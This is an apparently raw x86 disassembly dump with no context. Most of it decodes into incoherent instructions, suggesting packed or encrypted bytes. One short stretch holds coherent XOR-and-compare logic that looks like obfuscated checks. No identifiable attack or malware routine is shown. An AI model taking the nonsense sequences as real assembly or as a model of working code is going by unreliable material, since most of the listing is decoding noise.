  41b12b:	push   0xd47e19c1
  41b130:	lods   eax,DWORD PTR ds:[esi]
  41b131:	les    ebx,FWORD PTR [edx]
  41b133:	(bad)  
  41b134:	mov    eax,ds:0xb2f49fcc
  41b139:	cmp    eax,0x77d70059
  41b13e:	xchg   edi,eax
  41b13f:	sbb    esi,DWORD PTR [ecx-0x66dedfe4]
  41b145:	push   eax
  41b146:	push   0x232295bc
  41b14b:	repz cs xchg esp,esi
  41b14f:	mov    ecx,0xda45640f
  41b154:	xchg   ebp,eax
  41b155:	cli    
  41b156:	div    dh
  41b158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b159:	xchg   ecx,eax
  41b15a:	xor    DWORD PTR [edi],ecx
  41b15c:	cwde   
  41b15d:	(bad)  
  41b15f:	xchg   esp,eax
  41b160:	inc    esp
  41b161:	xchg   edi,eax
  41b162:	jae    0x41b120
  41b164:	push   es
  41b165:	cli    
  41b166:	cmp    ah,BYTE PTR [edx+0x50]
  41b169:	gs (bad) 
  41b16b:	mov    ch,0x9c
  41b16d:	xor    esp,DWORD PTR [edi-0x2c480662]
  41b173:	push   0xffffffc2
  41b175:	cwde   
  41b176:	in     eax,dx
  41b177:	pop    eax
  41b178:	mov    al,0x47
  41b17a:	pop    esp
  41b17b:	sub    BYTE PTR [edi-0x17],0x4e
  41b17f:	call   0x57e9:0xa7f77f5c
  41b186:	mov    ebp,DWORD PTR [ecx]
  41b188:	cmc    
  41b189:	and    DWORD PTR [ebp-0x49b8d661],0x3e8c1e77
  41b193:	in     al,0xf9
  41b195:	pusha  
  41b196:	aam    0x31
  41b198:	sbb    eax,0xdc89049a
  41b19d:	mov    WORD PTR [ebp-0x55],?
  41b1a0:	aas    
  41b1a1:	in     al,0x68
  41b1a3:	push   ss
  41b1a4:	bound  ebx,QWORD PTR [edx-0x7e]
  41b1a7:	pop    ebp
  41b1a8:	(bad)  
  41b1aa:	inc    edi
  41b1ab:	ror    edi,0x94
  41b1ae:	push   0xffffffa0
  41b1b0:	mov    al,ds:0x4bc14401
  41b1b5:	adc    esi,ecx
  41b1b7:	sub    cl,BYTE PTR [eax+edi*1-0x64]
  41b1bb:	outs   dx,DWORD PTR ds:[esi]
  41b1bc:	and    BYTE PTR [ecx],dh
  41b1be:	sub    BYTE PTR [edi-0x2b4a2ee2],dl
  41b1c4:	in     eax,dx
  41b1c5:	fistp  QWORD PTR [ebx-0x148b25b9]
  41b1cb:	jg     0x41b195
  41b1cd:	jp     0x41b1f4
  41b1cf:	ret    
  41b1d0:	fimul  DWORD PTR [esi]
  41b1d2:	js     0x41b166
  41b1d4:	cdq    
  41b1d5:	(bad)  
  41b1d6:	outs   dx,BYTE PTR ds:[esi]
  41b1d7:	xchg   edx,eax
  41b1d8:	fisub  WORD PTR [edi-0x7bca42a6]
  41b1de:	mov    ch,0x86
  41b1e0:	pushf  
  41b1e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1e2:	cdq    
  41b1e3:	lahf   
  41b1e4:	ds loope 0x41b21a
  41b1e7:	daa    
  41b1e8:	add    bh,BYTE PTR cs:[eax+0x2e5faf03]
  41b1ef:	mov    es,esp
  41b1f1:	cld    
  41b1f2:	add    ebx,DWORD PTR [ebp+ebx*2-0x36cff63e]
  41b1f9:	cld    
  41b1fa:	xchg   BYTE PTR cs:[esi],dl
  41b1fd:	dec    edx
  41b1fe:	pop    ds
  41b1ff:	push   ebx
  41b200:	loope  0x41b1d8
  41b202:	mov    edi,0x8fcdde03
  41b207:	adc    eax,0x2944a6e1
  41b20c:	jg     0x41b21e
  41b20e:	xor    eax,0x67f1eb12
  41b213:	cmp    BYTE PTR [ecx-0x208db199],dl
  41b219:	leave  
  41b21a:	jp     0x41b282
  41b21c:	ret    0xa1cf
  41b21f:	out    dx,eax
  41b220:	mov    ds:0x927ac079,al
  41b225:	dec    ebp
  41b226:	jge    0x41b287
  41b228:	lds    ebp,FWORD PTR [ecx-0x624025c5]
  41b22e:	add    ch,0x1e
  41b231:	daa    
  41b232:	cs cli 
  41b234:	enter  0x4793,0x5b
  41b238:	mov    ecx,0x9fee1096
  41b23d:	adc    eax,0x14140743
  41b242:	(bad)  
  41b244:	loopne 0x41b299
  41b246:	rol    BYTE PTR [edx],cl
  41b248:	pop    ecx
  41b249:	cs mov esp,0x5612aca7
  41b24f:	jae    0x41b295
  41b251:	cmp    eax,0x66edb70c
  41b256:	and    BYTE PTR [eax+0x5d9b891],ah
  41b25c:	sahf   
  41b25d:	ficom  WORD PTR [ebx-0x66]
  41b260:	hlt    
  41b261:	aas    
  41b262:	aam    0x28
  41b264:	out    dx,eax
  41b265:	jo     0x41b2aa
  41b267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b268:	popa   
  41b269:	addr16 push esi
  41b26b:	test   BYTE PTR [ebx-0x5a],bl
  41b26e:	arpl   WORD PTR [esi+edi*1],dx
  41b271:	push   ss
  41b272:	lods   eax,DWORD PTR ds:[esi]
  41b273:	das    
  41b274:	push   esi
  41b275:	into   
  41b276:	rcl    ebp,0xe7
  41b279:	or     DWORD PTR [ebp+esi*8+0x6b50f936],0x8316cc0c
  41b284:	jg     0x41b29d
  41b286:	pop    ebp
  41b287:	into   
  41b288:	inc    ebp
  41b289:	fwait
  41b28a:	push   ebx
  41b28b:	xchg   DWORD PTR [esp+esi*2+0x6973d1af],esi
  41b292:	pop    ss
  41b293:	mov    edi,0x9c58ba86
  41b298:	sub    BYTE PTR [eax+0x7b],ch
  41b29b:	ret    0xff9
  41b29e:	inc    ebp
  41b29f:	and    dl,ch
  41b2a1:	adc    BYTE PTR [edi+0x5f151630],0xd5
  41b2a8:	sbb    esp,0x76
  41b2ab:	dec    eax
  41b2ac:	outs   dx,BYTE PTR ds:[esi]
  41b2ad:	fisttp DWORD PTR [eax+0x78e5af3f]
  41b2b3:	arpl   WORD PTR [edi],sp
  41b2b5:	repz and BYTE PTR es:[ebx+0x67],dh
  41b2ba:	inc    esi
  41b2bb:	push   ss
  41b2bc:	fs iret 
  41b2be:	or     bl,0xcc
  41b2c1:	aas    
  41b2c2:	xor    ebx,DWORD PTR fs:[esp+eiz*2-0xc9480ac]
  41b2ca:	mov    dh,BYTE PTR [ecx]
  41b2cc:	inc    bl
  41b2ce:	xor    bl,BYTE PTR [ecx]
  41b2d0:	xlat   BYTE PTR ds:[ebx]
  41b2d1:	ins    BYTE PTR es:[edi],dx
  41b2d2:	pop    ebx
  41b2d3:	lea    ebp,[ebx]
  41b2d5:	test   ecx,ebx
  41b2d7:	mov    esp,0x98c0ceee
  41b2dc:	sbb    al,0x8d
  41b2de:	popa   
  41b2df:	rol    BYTE PTR [ebp-0x6ac9882b],1
  41b2e5:	push   esp
  41b2e6:	div    DWORD PTR [edx]
  41b2e8:	or     al,0x30
  41b2ea:	cmp    ebp,edi
  41b2ec:	push   eax
  41b2ed:	scas   eax,DWORD PTR es:[edi]
  41b2ee:	pop    esp
  41b2ef:	mov    dl,BYTE PTR [edx]
  41b2f1:	cmp    eax,0x7fbe7733
  41b2f6:	icebp  
  41b2f7:	dec    ebp
  41b2f8:	aad    0xa
  41b2fa:	push   ecx
  41b2fb:	mov    eax,ds:0x5cf8eaee
  41b300:	or     DWORD PTR [edi-0x30766f9c],esp
  41b306:	and    eax,DWORD PTR [ebx-0x1fe1a8d5]
  41b30c:	les    esp,FWORD PTR gs:[edi-0x13]
  41b310:	cdq    
  41b311:	fwait
  41b312:	add    BYTE PTR [ebx+0xd],dh
  41b315:	fs or  eax,0xc9d475f0
  41b31b:	adc    ebp,ebp
  41b31d:	jp     0x41b2f5
  41b31f:	or     eax,0x9503676f
  41b324:	loop   0x41b2b4
  41b326:	mov    ds:0xcca4d1a3,al
  41b32b:	inc    edi
  41b32c:	idiv   BYTE PTR [edx+eiz*4+0x7983e753]
  41b333:	sbb    ah,BYTE PTR [edx+0x15814d18]
  41b339:	frstor [eax]
  41b33b:	dec    ecx
  41b33c:	rol    BYTE PTR [ecx+0x79a577f2],cl
  41b342:	retf   0xac0f
  41b345:	ret    0xc102
  41b348:	call   0x24863c4f
  41b34d:	xor    al,0x8b
  41b34f:	inc    esp
  41b350:	and    al,0x18
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	add    bl,BYTE PTR [esi+0x33]
  41b36a:	push   0xffffffbb
  41b36c:	(bad)  
  41b36d:	push   ss
  41b36e:	sbb    BYTE PTR [edx+edx*1+0x44171818],bh
  41b375:	xchg   BYTE PTR [esi],ah
  41b377:	cdq    
  41b378:	test   al,ch
  41b37a:	and    BYTE PTR ds:0xb948a2e9,dh
  41b380:	ins    DWORD PTR es:[edi],dx
  41b381:	cmp    dh,BYTE PTR [ecx-0x5b]
  41b384:	pop    esp
  41b385:	mov    eax,0x2da89281
  41b38a:	mov    ebx,0xa072952c
  41b38f:	push   cs
  41b390:	sub    al,cl
  41b392:	jno    0x41b369
  41b394:	leave  
  41b395:	mov    DWORD PTR [ebp-0x213387f6],esi
  41b39b:	addr16 call 0x1a1b:0xe42774a4
  41b3a3:	jb     0x41b3c3
  41b3a5:	sar    ch,0x8f
  41b3a8:	sub    ecx,eax
  41b3aa:	and    esp,ebp
  41b3ac:	jae    0x41b367
  41b3ae:	ja     0x41b358
  41b3b0:	dec    esi
  41b3b1:	sub    al,al
  41b3b3:	test   al,0x54
  41b3b5:	mov    ecx,0x860a3214
  41b3ba:	xchg   edi,eax
  41b3bb:	fnstsw WORD PTR [esi]
  41b3bd:	mov    ecx,0xc704deac
  41b3c2:	shl    BYTE PTR [eax+0x40],cl
  41b3c5:	dec    edi
  41b3c6:	ficom  DWORD PTR [edi]
  41b3c8:	repnz push edx
  41b3ca:	fdivr  DWORD PTR [esp+eax*4+0x0]
  41b3ce:	in     eax,dx
  41b3cf:	scas   al,BYTE PTR es:[edi]
  41b3d0:	pop    ss
  41b3d1:	(bad)  
  41b3d4:	push   es
  41b3d5:	popa   
  41b3d6:	addr16 daa 
  41b3d8:	push   cs
  41b3d9:	das    
  41b3da:	inc    ecx
  41b3db:	adc    BYTE PTR [eax],al
  41b3dd:	push   esi
  41b3de:	cwde   
  41b3df:	inc    DWORD PTR [ebx+edx*4]
  41b3e2:	adc    al,0x3d
  41b3e4:	and    bl,bl
  41b3e6:	sub    al,0xe7
  41b3e8:	jmp    0xf3e70193
  41b3ed:	push   edx
  41b3ee:	jge    0x41b436
  41b3f0:	inc    DWORD PTR [edx+ecx*1+0x9dec51e]
  41b3f7:	jne    0x41b39b
  41b3f9:	popa   
  41b3fa:	xchg   BYTE PTR [edi],ch
  41b3fc:	into   
  41b3fd:	push   ecx
  41b3fe:	cld    
  41b3ff:	aas    
  41b400:	jo     0x41b463
  41b402:	jno    0x41b39a
  41b404:	in     al,0xc2
  41b406:	pop    ss
  41b407:	sub    BYTE PTR [ecx-0x3a3b458c],0xc5
  41b40e:	jbe    0x41b488
  41b410:	sub    bl,dh
  41b412:	ret    0x752b
  41b415:	mov    ds:0x50c34db2,al
  41b41a:	or     dl,BYTE PTR [edi+ebp*1]
  41b41d:	dec    edx
  41b41e:	jae    0x41b3a2
  41b420:	iret   
  41b421:	fisubr WORD PTR [eax+0x5d]
  41b424:	xor    DWORD PTR [ebx-0x6473f5ee],edx
  41b42a:	in     eax,dx
  41b42b:	or     DWORD PTR [edi-0x53],ecx
  41b42e:	cmp    edx,DWORD PTR ds:0x5bb32cc3
  41b434:	sub    esp,eax
  41b436:	or     BYTE PTR [ecx+0x1b],ah
  41b439:	push   ecx
  41b43a:	xchg   ecx,eax
  41b43b:	adc    eax,0x37d0c0b1
  41b440:	mov    cl,0x79
  41b442:	aaa    
  41b443:	imul   ecx,DWORD PTR [ebp-0x4e6327e9],0xffffff88
  41b44a:	stc    
  41b44b:	sub    DWORD PTR [esp+esi*2],ecx
  41b44e:	(bad)  [edi]
  41b450:	popa   
  41b451:	mov    eax,0xed1711b8
  41b456:	pop    ebp
  41b457:	icebp  
  41b458:	popa   
  41b459:	mov    edi,0x391fb6f
  41b45e:	lds    ecx,FWORD PTR [esi-0x3ca23e47]
  41b464:	mov    bl,0x6f
  41b466:	mov    bl,0x19
  41b468:	xor    esi,DWORD PTR [edi]
  41b46a:	jo     0x41b4ab
  41b46c:	add    cl,BYTE PTR [ebx+0x42ca9677]
  41b472:	lods   al,BYTE PTR ds:[esi]
  41b473:	mov    ds:0x9c251a45,eax
  41b479:	add    eax,0xe3b14014
  41b47e:	xor    al,0x74
  41b480:	sar    BYTE PTR [edx],0xf5
  41b483:	inc    edi
  41b484:	push   esp
  41b485:	jns    0x41b4dd
  41b487:	mul    DWORD PTR [esi-0x4be6b5cb]
  41b48d:	xor    edx,DWORD PTR [ecx]
  41b48f:	mul    edi
  41b491:	scas   al,BYTE PTR es:[edi]
  41b492:	inc    ebx
  41b493:	jmp    0xe056:0x17802f2e
  41b49a:	add    al,0x2
  41b49c:	push   edx
  41b49d:	icebp  
  41b49e:	inc    ecx
  41b49f:	js     0x41b46a
  41b4a1:	mov    ebp,0xd32c179
  41b4a6:	xor    bl,BYTE PTR [ebp+0x277b168d]
  41b4ac:	jmp    0x47e7316f
  41b4b1:	mov    esi,0xc071ff4d
  41b4b6:	pop    esi
  41b4b7:	jmp    0xda0e:0x7589fcee
  41b4be:	sbb    DWORD PTR [eax+edx*8],ecx
  41b4c1:	(bad)  
  41b4c2:	retf   0xcc82
  41b4c5:	fwait
  41b4c6:	mov    esp,0x284bed55
  41b4cb:	arpl   bp,sp
  41b4cd:	cmp    cl,BYTE PTR [ebp+0x6d]
  41b4d0:	and    edx,0xffffffa7
  41b4d3:	adc    dh,BYTE PTR [edi]
  41b4d5:	push   ebx
  41b4d6:	mov    ebp,DWORD PTR [ecx-0x7e]
  41b4d9:	pop    edi
  41b4da:	push   0xffffffff
  41b4dc:	cld    
  41b4dd:	xchg   ebx,eax
  41b4de:	pop    es
  41b4df:	mov    DWORD PTR [ebx-0x75],ecx
  41b4e2:	mov    ch,0xf1
  41b4e4:	inc    edx
  41b4e5:	rcr    BYTE PTR [eax],cl
  41b4e7:	and    DWORD PTR [ecx+0x28],0x67910d17
  41b4ee:	jno    0x41b4f9
  41b4f0:	jb     0x41b554
  41b4f2:	nop
  41b4f3:	jg     0x41b4ca
  41b4f5:	push   eax
  41b4f6:	sar    esp,1
  41b4f8:	mov    ecx,0x25388722
  41b4fd:	jmp    0x2b79:0x6cdb0a48
  41b504:	mov    esp,0x3de04129
  41b509:	pop    edi
  41b50a:	jo     0x41b573
  41b50c:	popf   
  41b50d:	gs jns 0x41b50c
  41b510:	mov    cl,0x12
  41b512:	idiv   BYTE PTR [esi+ecx*2-0x7d203ee8]
  41b519:	pop    esp
  41b51a:	jnp    0x41b4c4
  41b51c:	fnstsw WORD PTR ds:0x71b61b5f
  41b522:	test   BYTE PTR [edi+0x293e37be],al
  41b528:	adc    DWORD PTR [edi-0x49],ebx
  41b52b:	push   0x2dff5d11
  41b530:	or     al,0xd5
  41b532:	lods   al,BYTE PTR ds:[esi]
  41b533:	cmp    eax,0x391d301a
  41b538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b539:	shr    DWORD PTR [edi+eax*1-0x78d331c8],cl
  41b540:	jbe    0x41b5a2
  41b542:	dec    edx
  41b543:	les    ebp,FWORD PTR [eax+0x1fe1e4a1]
  41b549:	push   es
  41b54a:	adc    DWORD PTR [esi],eax
  41b54c:	test   BYTE PTR [ebp+ebx*4-0x75f9100e],0x9c
  41b554:	xchg   cl,cl
  41b556:	jmp    0x4a3400ea
  41b55b:	adc    edi,DWORD PTR [ebx]
  41b55d:	push   0x5d
  41b55f:	jae    0x41b5b4
  41b561:	mov    edi,0xf034479
  41b566:	cld    
  41b567:	out    0xd,eax
  41b569:	popf   
  41b56a:	clc    
  41b56b:	pop    ecx
  41b56c:	mov    dh,BYTE PTR [edx]
  41b56e:	add    BYTE PTR [ecx+0x50],dl
  41b571:	mov    esi,DWORD PTR ds:0x3e2fbefe
  41b577:	ins    BYTE PTR es:[edi],dx
  41b578:	imul   edi,DWORD PTR [ebx],0x6e
  41b57b:	stc    
  41b57c:	aas    
  41b57d:	repnz rol BYTE PTR [eax+0x4f],0x6d
  41b582:	xchg   esi,eax
  41b583:	dec    edi
  41b584:	jmp    0x441:0xa31b4a4a
  41b58b:	in     al,0x7c
  41b58d:	ret    
  41b58e:	pusha  
  41b58f:	in     al,dx
  41b590:	dec    eax
  41b591:	jmp    0x41b525
  41b593:	push   edx
  41b594:	lds    edx,FWORD PTR [edx+0x29]
  41b597:	pop    es
  41b598:	and    eax,0xfda09301
  41b59d:	fnstcw WORD PTR [ecx+0x2a2f6932]
  41b5a3:	inc    ebp
  41b5a4:	ret    0x46a6
  41b5a7:	push   cs
  41b5a8:	nop
  41b5a9:	or     ch,al
  41b5ab:	adc    BYTE PTR ds:0xe075564d,bh
  41b5b1:	push   es
  41b5b2:	push   cs
  41b5b3:	retf   0xd4a4
  41b5b6:	xchg   ecx,eax
  41b5b7:	les    edi,FWORD PTR [ebx]
  41b5b9:	push   edi
  41b5ba:	jmp    0x626e:0x1240e600
  41b5c1:	mov    bl,0x35
  41b5c3:	mov    ebx,0x670c81bb
  41b5c8:	inc    edx
  41b5c9:	jmp    0x129357cf
  41b5ce:	inc    ebp
  41b5cf:	xchg   edx,eax
  41b5d0:	test   al,0x57
  41b5d2:	ins    DWORD PTR es:[edi],dx
  41b5d3:	pusha  
  41b5d4:	lods   al,BYTE PTR ds:[esi]
  41b5d5:	mov    ds:0x6c3dacba,eax
  41b5da:	ds pop edi
  41b5dc:	jecxz  0x41b5e4
  41b5de:	pushf  
  41b5df:	mov    DWORD PTR [edi+ebp*2],ebx
  41b5e2:	int3   
  41b5e3:	adc    BYTE PTR [esi+0x11],dl
  41b5e6:	test   DWORD PTR [esi],ebp
  41b5e8:	out    dx,eax
  41b5e9:	xchg   edi,eax
  41b5ea:	push   ecx
  41b5eb:	or     DWORD PTR [edx-0x28ec0e56],0x36
  41b5f2:	push   edi
  41b5f3:	enter  0x51fb,0x3a
  41b5f7:	call   0x6455c6e2
  41b5fc:	data16 mov cl,0xb4
  41b5ff:	retf   0x31f1
  41b602:	ror    dh,cl
  41b604:	(bad)  
  41b605:	sbb    DWORD PTR es:[ecx-0x35],ecx
  41b609:	stc    
  41b60a:	jecxz  0x41b682
  41b60c:	in     eax,dx
  41b60d:	js     0x41b597
  41b60f:	into   
  41b610:	cmc    
  41b611:	xor    cl,dh
  41b613:	cmp    bh,dh
  41b615:	pop    esi
  41b616:	pushf  
  41b617:	adc    BYTE PTR [eax-0x1c],0x85
  41b61b:	aam    0x8e
  41b61d:	xchg   edx,eax
  41b61e:	lds    eax,FWORD PTR [ecx+0x6e]
  41b621:	hlt    
  41b622:	mov    ah,BYTE PTR [esi]
  41b624:	push   cs
  41b625:	xchg   edi,eax
  41b626:	push   ebp
  41b627:	(bad)  
  41b629:	jmp    0x9448:0xc1b6af1f
  41b630:	fucomip st,st(5)
  41b632:	adc    DWORD PTR [ecx+ebp*2+0x69],edi
  41b636:	dec    edx
  41b637:	sti    
  41b638:	arpl   WORD PTR [edi+ebx*8-0x69],si
  41b63c:	xchg   DWORD PTR [ebx],ebx
  41b63e:	pop    esi
  41b63f:	je     0x41b5fa
  41b641:	sbb    BYTE PTR [ecx],bh
  41b643:	dec    esp
  41b644:	xchg   BYTE PTR [edx+0x6c],dh
  41b647:	mov    ebp,0xe3a76a42
  41b64c:	hlt    
  41b64d:	lea    esp,[ebx+0x42]
  41b650:	sahf   
  41b651:	inc    esi
  41b652:	inc    ecx
  41b653:	xor    DWORD PTR [edi-0x71],edi
  41b656:	lock xchg si,ax
  41b659:	mov    ds:0xa27e78a6,al
  41b65e:	jne    0x41b695
  41b660:	fs pushf 
  41b662:	push   edx
  41b663:	cdq    
  41b664:	inc    ebx
  41b665:	int    0x89
  41b667:	xor    DWORD PTR [eax],eax
  41b669:	sub    eax,0x3f9b56e8
  41b66e:	sub    ebx,edi
  41b670:	dec    ebx
  41b671:	cli    
  41b672:	addr16 jge 0x41b646
  41b675:	ret    0x5167
  41b678:	adc    cl,BYTE PTR [esi]
  41b67a:	out    0x2d,eax
  41b67c:	inc    ecx
  41b67d:	sbb    eax,0xa74ad72
  41b682:	repz mov dh,0x1a
  41b685:	(bad)  
  41b687:	sahf   
  41b688:	add    ah,BYTE PTR [ecx+0x744fbf79]
  41b68e:	dec    ebp
  41b68f:	mov    ebp,0xd4e492d9
  41b694:	fsub   DWORD PTR [esi+0x54]
  41b697:	xor    BYTE PTR [edi+0xf],bl
  41b69a:	jle    0x41b68d
  41b69c:	loopne 0x41b6da
  41b69e:	sub    DWORD PTR [eax+0x2e],0xffffffda
  41b6a2:	pop    ebp
  41b6a3:	adc    ch,dl
  41b6a5:	retf   
  41b6a6:	mov    ebx,ecx
  41b6a8:	lods   al,BYTE PTR ds:[esi]
  41b6a9:	shl    BYTE PTR [edi+eiz*4+0x79c908f8],1
  41b6b0:	and    dl,ch
  41b6b2:	(bad)  
  41b6b3:	neg    DWORD PTR [ebp+0x46f04917]
  41b6b9:	pop    es
  41b6ba:	add    eax,0x50f4ab2d
  41b6bf:	and    DWORD PTR [edi],eax
  41b6c1:	cmp    eax,edi
  41b6c3:	mov    WORD PTR [esi-0x19],?
  41b6c6:	inc    eax
  41b6c7:	mov    WORD PTR [ebp+0x3c],fs
  41b6ca:	cmp    DWORD PTR [ebx-0x40d87db2],ebx
  41b6d0:	stos   BYTE PTR es:[edi],al
  41b6d1:	leave  
  41b6d2:	repnz shl edi,0xa0
  41b6d6:	aaa    
  41b6d7:	lods   eax,DWORD PTR ds:[esi]
  41b6d8:	out    dx,al
  41b6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6da:	jo     0x41b6ee
  41b6dc:	dec    BYTE PTR [ebx]
  41b6de:	mov    BYTE PTR [ecx+0x53221fec],bh
  41b6e4:	test   eax,0x507ba33f
  41b6e9:	inc    eax
  41b6ea:	sbb    esp,edx
  41b6ec:	or     al,0xd7
  41b6ee:	pop    eax
  41b6ef:	aam    0x36
  41b6f1:	push   ebx
  41b6f2:	xor    BYTE PTR [ebp+0x6cab1ce6],bh
  41b6f8:	imul   ebx,DWORD PTR [edx],0x74
  41b6fb:	adc    bl,ah
  41b6fd:	ret    
  41b6fe:	pop    edx
  41b6ff:	sbb    al,0x17
  41b701:	ins    BYTE PTR es:[edi],dx
  41b702:	mov    al,ds:0x7853eea8
  41b707:	in     al,dx
  41b708:	mov    al,ds:0x3b290930
  41b70d:	fmul   QWORD PTR [edx]
  41b70f:	lea    esi,[edx+edi*2]
  41b712:	popa   
  41b713:	push   ebx
  41b714:	retf   
  41b715:	pop    esi
  41b716:	popf   
  41b717:	jns    0x41b73a
  41b719:	cli    
  41b71a:	xchg   ebx,eax
  41b71b:	mov    edx,0xc08843d4
  41b720:	push   ecx
  41b721:	cmp    DWORD PTR [ebx+0x71],eax
  41b724:	pop    edi
  41b725:	shl    eax,0x1e
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225e4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225dc
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42256c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx-0x7355d674],dh
  41b815:	pop    edx
  41b816:	mov    eax,ds:0x16895e70
  41b81b:	sbb    BYTE PTR [edx+edx*1+0x56ae1818],bh
  41b822:	cs xor dh,bh
  41b825:	loop   0x41b7bf
  41b827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b828:	or     bl,BYTE PTR [ebx+0x2c58faa4]
  41b82e:	clc    
  41b82f:	sbb    eax,0xaddb5bc4
  41b834:	ins    BYTE PTR es:[edi],dx
  41b835:	aas    
  41b836:	pusha  
  41b837:	push   ebp
  41b838:	das    
  41b839:	mov    ds:0x2a35f89,al
  41b83e:	sbb    dl,BYTE PTR [eax-0x15]
  41b841:	and    eax,0x5daa04bd
  41b846:	addr16 (bad) 
  41b849:	shr    edx,cl
  41b84b:	pop    ecx
  41b84c:	jo     0x41b8c8
  41b84e:	fwait
  41b84f:	aaa    
  41b850:	int3   
  41b851:	mov    dl,0xf6
  41b853:	pop    ebx
  41b855:	sbb    ch,BYTE PTR [ebx+0x413642a5]
  41b85b:	dec    ebp
  41b85c:	cld    
  41b85d:	iret   
  41b85e:	xor    al,0x5e
  41b860:	cmp    ebp,edx
  41b862:	sbb    ebx,DWORD PTR [edi]
  41b864:	push   esi
  41b865:	out    0xa6,al
  41b867:	sbb    ebp,DWORD PTR [eax+0x479ba5d3]
  41b86d:	lahf   
  41b86e:	es dec eax
  41b870:	pop    edx
  41b871:	mov    ebx,0x1df01325
  41b876:	inc    edx
  41b877:	mov    ebp,0x15cd46a9
  41b87c:	aad    0x6
  41b87e:	and    ebx,DWORD PTR [esi-0xc6e1fa9]
  41b884:	test   BYTE PTR [edx-0x5c770a6c],al
  41b88a:	stc    
  41b88b:	gs inc ecx
  41b88d:	fsub   DWORD PTR [esi]
  41b88f:	or     eax,DWORD PTR [esi]
  41b891:	jo     0x41b855
  41b893:	add    DWORD PTR [ecx+0x35],0x6cf75ee
  41b89a:	xor    BYTE PTR [ecx],bh
  41b89c:	ins    BYTE PTR es:[edi],dx
  41b89d:	cmp    al,0x2a
  41b89f:	mov    esi,0xe79e1672
  41b8a4:	jl     0x41b920
  41b8a6:	xchg   ebp,eax
  41b8a7:	mov    ch,0x2d
  41b8a9:	xor    eax,0xd53f6cda
  41b8ae:	cld    
  41b8af:	jae    0x41b837
  41b8b1:	and    al,0x88
  41b8b3:	sbb    al,0xef
  41b8b5:	int    0xbd
  41b8b7:	dec    ebx
  41b8b8:	lahf   
  41b8b9:	jo     0x41b921
  41b8bb:	lahf   
  41b8bc:	xchg   esi,eax
  41b8bd:	mov    ds:0xc94a2148,eax
  41b8c2:	(bad)
  41b8c5:	add    DWORD PTR [eax-0x1d],ecx
  41b8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8c9:	fst    QWORD PTR [ebp+0xa]
  41b8cc:	in     al,0x28
  41b8ce:	xchg   dl,al
  41b8d0:	shl    ah,cl
  41b8d2:	pop    ecx
  41b8d3:	sar    BYTE PTR [ecx],cl
  41b8d5:	jecxz  0x41b88b
  41b8d7:	pop    ebx
  41b8d8:	mov    esp,0x58263b87
  41b8dd:	enter  0x9aee,0xda
  41b8e1:	test   DWORD PTR [eax],0xfd3e671f
  41b8e7:	iret   
  41b8e8:	leave  
  41b8e9:	cmp    dl,BYTE PTR [ecx]
  41b8eb:	test   DWORD PTR [esi],eax
  41b8ed:	and    DWORD PTR [ebp-0x2162e062],eax
  41b8f3:	dec    edx
  41b8f4:	xor    ebp,DWORD PTR [esi-0x60]
  41b8f7:	hlt    
  41b8f8:	mov    DWORD PTR ds:0xccb34163,0x9d279419
  41b902:	pop    ds
  41b903:	jns    0x41b8f7
  41b905:	cmp    BYTE PTR [ebx+0x2fda2917],0x6b
  41b90c:	push   esp
  41b90d:	in     al,0x75
  41b90f:	dec    esi
